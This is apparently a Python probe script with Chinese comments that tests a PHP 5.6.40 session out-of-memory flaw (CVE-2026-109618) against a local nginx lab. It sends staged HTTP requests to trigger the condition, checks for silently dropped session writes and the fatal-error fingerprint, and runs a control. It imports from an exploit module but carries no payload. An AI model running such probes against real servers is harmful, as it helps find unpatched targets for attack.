#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""probe4_56.py — CVE-2026-109618 语义验证探针（PHP 5.6.40，纯 HTTP）。

2026-10-21 公告（GHSA-w8hw-w9fx-j79w）：OOM 用 longjmp 早退后，请求的
内存处于半初始化态，shutdown 阶段把它当作有效数据处理 => RCE。
8.4.27 引入 delayed_oom（超软限只排队、分配继续成功）修复了引擎侧；
5.6.40 EOL 从未修复 —— 本探针验证它在 nginx+fpm 栈上的可观测行为。

三段式 p3s（mk -> p3 -> rd），攻击面只有 nginx :8089 的纯 HTTP：
  mk  建会话（marker=m1）
  p3  $_SESSION 持 4MB 活串正常结束；RSHUTDOWN -> php_session_flush ->
      php_session_encode 序列化处 OOM（~8.5M > 8M）。fatal bailout 被
      session RSHUTDOWN 的 zend_try 吞掉 => s_write 永不执行。
  rd  抬限回读，输出 marker/pad 判定：
      SESSION-LOST(pad=0)    会话写盘被静默丢弃 —— 含漏洞行为
                             （8.4.26 / 5.6.40 同款）
      SESSION-WRITTEN(pad>0) 会话完整落盘 —— 修复版行为（8.4.27+）

指纹：5.6/8.4.26 的 p3 响应带 "in <b>Unknown</b> on line <b>0</b>"
fatal（OOM 在 RSHUTDOWN 编码内，无用户帧）；修复版无 fatal。

用法：
  python tools56/probe4_56.py [--rounds N] [--url http://127.0.0.1:8089/gh.php]

退出码：0 = 观测到 SESSION-LOST（写盘被丢弃，漏洞语义）；1 = 无。
"""

from __future__ import annotations

import argparse
import os
import re
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from exploit import Target  # noqa: E402

URL = "http://127.0.0.1:8089/gh.php"


def run_p3s(url: str, rounds: int) -> bool:
    print(f"\n{'=' * 62}\n[*] variant p3s: mk -> p3(4MB pad) -> rd\n{'=' * 62}")
    hits = 0
    for i in range(rounds):
        # sid 只用 [0-9a-z]：use_strict_mode 虽为 0，仍保持与 84 探针
        # 相同的格式约定，避免格式差异引入歧义。
        sid = "probe{:08d}{:02d}".format(int(time.time() * 1000) % 10**8, i)
        t = Target(url, timeout=90.0, verbose=False)
        code, b_mk = t.get(f"/gh.php?stage=mk&sid={sid}", read_cap=1 << 18)
        code, b_p3 = t.get(f"/gh.php?stage=p3&sid={sid}", read_cap=1 << 18)
        code, b_rd = t.get(f"/gh.php?stage=rd&sid={sid}", read_cap=1 << 18)
        m = re.search(rb"pad=(\d+)", b_rd)
        pad = int(m.group(1)) if m else -1
        fatal_unknown = b"in <b>Unknown</b>" in b_p3
        verdict = ("SESSION-LOST(pad=0)" if pad == 0
                   else "SESSION-WRITTEN(pad>0)" if pad > 0 else "rd-unparseable")
        print(f"[round {i}] sid={sid} p3-fatal-in-Unknown={fatal_unknown} "
              f"rd: {b_rd[:60]!r} -> {verdict}")
        if pad == 0 or fatal_unknown:
            hits += 1
    print(f"\n[=] p3s: rounds={rounds} session-lost/fatal-unknown hits={hits}")
    return hits > 0


def run_p3c(url: str) -> bool:
    """版本内自对照：p3c(1MB pad) 不触发 encode OOM，会话应完整落盘。

    5.6.40 是 EOL 无修复版可切，用同形状小 pad 证明 p3 的丢盘是
    "OOM 精确落在 encode 分配点" 导致，而非写盘/读回路径本身损坏。
    """
    print(f"\n{'=' * 62}\n[*] control p3c: mk -> p3c(1MB pad) -> rd\n{'=' * 62}")
    sid = "ctrl{:08d}".format(int(time.time() * 1000) % 10**8)
    t = Target(url, timeout=90.0, verbose=False)
    code, b_mk = t.get(f"/gh.php?stage=mk&sid={sid}", read_cap=1 << 18)
    code, b_p3c = t.get(f"/gh.php?stage=p3c&sid={sid}", read_cap=1 << 18)
    code, b_rd = t.get(f"/gh.php?stage=rd&sid={sid}", read_cap=1 << 18)
    m = re.search(rb"pad=(\d+)", b_rd)
    pad = int(m.group(1)) if m else -1
    fatal = b"Fatal error" in b_p3c
    print(f"[ctrl] sid={sid} p3c-fatal={fatal} rd: {b_rd[:60]!r} "
          f"-> {'SESSION-WRITTEN(pad=1048576)' if pad == 1048576 else 'UNEXPECTED'}")
    return pad == 1048576


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--rounds", type=int, default=3, help="mk->p3->rd 循环次数")
    ap.add_argument("--url", default=URL, help="gh.php 的完整 URL")
    args = ap.parse_args()

    hit = run_p3s(args.url, args.rounds)
    ctrl_ok = run_p3c(args.url)
    print("\n" + "=" * 62)
    if hit and ctrl_ok:
        print("[+] CVE-2026-109618 语义观测成立：OOM 后 shutdown 静默丢弃"
              "会话写盘，且对照组正常落盘 —— php-5.6.40（EOL，未修复）。")
        return 0
    if hit and not ctrl_ok:
        print("[!] SESSION-LOST 观测到但对照组异常 —— 丢盘原因存疑，"
              "需检查写盘/读回路径。")
        return 1
    print("[-] 未观测到 SESSION-LOST（会话正常落盘或响应异常）。")
    return 1


if __name__ == "__main__":
    sys.exit(main())
